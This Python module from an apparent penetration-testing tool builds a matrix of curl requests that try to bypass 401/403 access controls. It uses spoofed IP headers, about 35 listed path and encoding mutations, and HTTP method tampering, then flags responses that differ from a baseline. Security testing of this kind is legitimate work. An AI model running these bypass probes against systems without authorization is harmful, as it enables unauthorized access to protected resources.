"""401 / 403 access-control bypass matrix.

HackPraxis takes every 401/403 endpoint found in Step 1 (Enumeration) and
replays each one through a matrix of well-known tricks: spoofed source-IP
headers, URL/path mutations, and HTTP method changes. Each probe is a single
curl, and each result carries the *resolved* link (the real URL you can open)
plus the exact technique that produced it - no {P} placeholders.

Results come back grouped by endpoint and by response status, so a bypass that
behaves differently from the baseline stands out instead of scrolling past.

Techniques from standard public references (HackTricks, PortSwigger,
PayloadsAllTheThings, Vidoc Security). Authorized, in-scope targets only.
"""

from __future__ import annotations

from pathlib import Path
from urllib.parse import urlsplit, urlunsplit

from ..runner import Plan, Step

DATA = Path(__file__).resolve().parent.parent / "data"
HEADERS_WL = DATA / "wordlists" / "bypass_headers.txt"
PATHS_WL = DATA / "wordlists" / "bypass_paths.txt"

METHODS = ["POST", "HEAD", "OPTIONS", "PUT", "DELETE", "PATCH", "TRACE"]
_WRITEOUT = "%{http_code} %{size_download} %{time_total}"

MAX_ENDPOINTS = 25

# Readable names for the path templates (keeps {P}/{S} out of the UI).
PATH_NAMES = {
    "{P}/": "trailing slash", "{P}//": "double slash", "{P}/.": "trailing /.",
    "{P}/./": "trailing /./", "{P}/..": "trailing /..", "{P}/..;/": "path param /..;/",
    "{P}..;/": "suffix ..;/", "{P};/": "matrix ;/", "{P}/;/": "matrix /;/",
    "{P}/.;/": "/.;/", "//{P}//": "wrapped //..//", "/./{P}": "prefix /./",
    "/.{P}": "prefix /.", "{P}%20": "trailing %20 (space)", "{P}%09": "trailing %09 (tab)",
    "{P}%00": "null byte %00", "{P}.": "trailing dot", "{P}..": "trailing ..",
    "{P}?": "trailing ?", "{P}#": "fragment #", "{P}%23": "encoded # %23",
    "/%2e/{S}": "encoded dot prefix", "/%2e%2e/{S}": "encoded dotdot prefix",
    "{P}/%2e": "trailing /%2e", "{P}/%2e%2e": "trailing /%2e%2e", "{P}/%2f": "trailing /%2f",
    "{P}%2f": "trailing %2f", "{P}..%2f": "..%2f", "{P}.json": "suffix .json",
    "{P}.html": "suffix .html", "{P}.css": "suffix .css", "{P}~": "tilde ~",
    "{P}%2500": "double-encoded null %2500", "/{S}/.": "segment /.",
    "/{S}/..;/": "segment /..;/", "/./{S}/./": "wrapped /./ /./",
}

META = {
    "id": "bypass_401_403",
    "title": "401 / 403 Bypass",
    "blurb": "Replay every forbidden endpoint through header, path and method tricks.",
    "engines": [{"id": "curl", "label": "curl matrix", "tool": "curl",
                 "hint": "One readable curl per technique; compares status & size to a baseline."}],
    "fields": [
        {"name": "use_headers", "label": "Header tricks (spoofed source IP / rewrite)",
         "type": "checkbox", "default": True},
        {"name": "use_paths", "label": "Path & encoding tricks", "type": "checkbox", "default": True},
        {"name": "use_methods", "label": "HTTP method / verb tampering", "type": "checkbox", "default": True},
        {"name": "extra_target", "label": "Extra endpoint to test (optional)", "type": "text",
         "placeholder": "https://host.example.com/admin  (added to the forbidden list)"},
        {"name": "max_requests", "label": "Max requests per endpoint", "type": "number", "default": 120},
    ],
    "consumes_forbidden": True,   # app injects the 401/403 endpoint list
}


def _with_scheme(t: str) -> str:
    t = (t or "").strip()
    return ("https://" + t) if (t and "://" not in t) else t


def _read_wordlist(path: Path) -> list[str]:
    if not path.exists():
        return []
    return [s.strip() for s in path.read_text(encoding="utf-8", errors="ignore").splitlines()
            if s.strip() and not s.startswith("#")]


def _mutate_path(url: str, template: str) -> str:
    parts = urlsplit(url)
    path = parts.path or "/"
    seg = path.rstrip("/").rsplit("/", 1)[-1]
    new_path = template.replace("{P}", path).replace("{S}", seg)
    return urlunsplit((parts.scheme, parts.netloc, new_path, "", ""))


def _curl_step(link: str, endpoint: str, technique: str, extra: list[str],
               method: str | None = None) -> Step:
    argv = ["curl", "-sS", "-k", "-o", "/dev/null", "-w", _WRITEOUT, "--max-time", "12"]
    if method and method != "GET":
        argv += ["-X", method]
    argv += extra + [link]
    return Step(
        tool="curl", argv=argv, target=link, parse="curl-metrics",
        label=technique,
        meta={"endpoint": endpoint, "technique": technique, "link": link},
        explain=[{"token": technique, "meaning": "Probe against " + endpoint}],
    )


def build(params: dict) -> Plan:
    endpoints = [e for e in (params.get("endpoints") or []) if e]
    extra = _with_scheme(params.get("extra_target") or "")
    if extra and extra not in endpoints:
        endpoints.append(extra)
    # de-dup, preserve order, cap
    seen, uniq = set(), []
    for e in endpoints:
        if e not in seen:
            seen.add(e); uniq.append(e)
    endpoints = uniq[:MAX_ENDPOINTS]

    if not endpoints:
        return Plan(module="bypass_401_403", engine="curl", title="401/403 bypass",
                    summary="No 401/403 endpoints yet. Run Step 1 (Enumeration) first, "
                            "or add one in 'Extra endpoint' above.", steps=[])

    try:
        budget = max(1, min(int(params.get("max_requests") or 120), 200))
    except (TypeError, ValueError):
        budget = 120

    headers = _read_wordlist(HEADERS_WL) if params.get("use_headers", True) else []
    paths = _read_wordlist(PATHS_WL) if params.get("use_paths", True) else []
    methods = METHODS if params.get("use_methods", True) else []

    steps: list[Step] = []
    for ep in endpoints:
        # cheap, high-signal techniques first so a small budget still covers them
        per: list[Step] = [_curl_step(ep, ep, "baseline (GET)", [])]
        for m in methods:
            per.append(_curl_step(ep, ep, f"method  {m}", [], method=m))
        for line in headers:
            if ":" in line:
                per.append(_curl_step(ep, ep, f"header  {line}", ["-H", line]))
        for tmpl in paths:
            link = _mutate_path(ep, tmpl)
            per.append(_curl_step(link, ep, "path  " + PATH_NAMES.get(tmpl, "mutation"), []))
        steps.extend(per[:budget])   # keep baseline + up to budget-1 probes

    summary = (f"{len(endpoints)} forbidden endpoint(s) × techniques = {len(steps)} requests. "
               "Open a status group under each endpoint; anything that isn't the baseline status is a lead.")
    return Plan(module="bypass_401_403", engine="curl", title="401/403 bypass matrix",
                summary=summary, steps=steps)
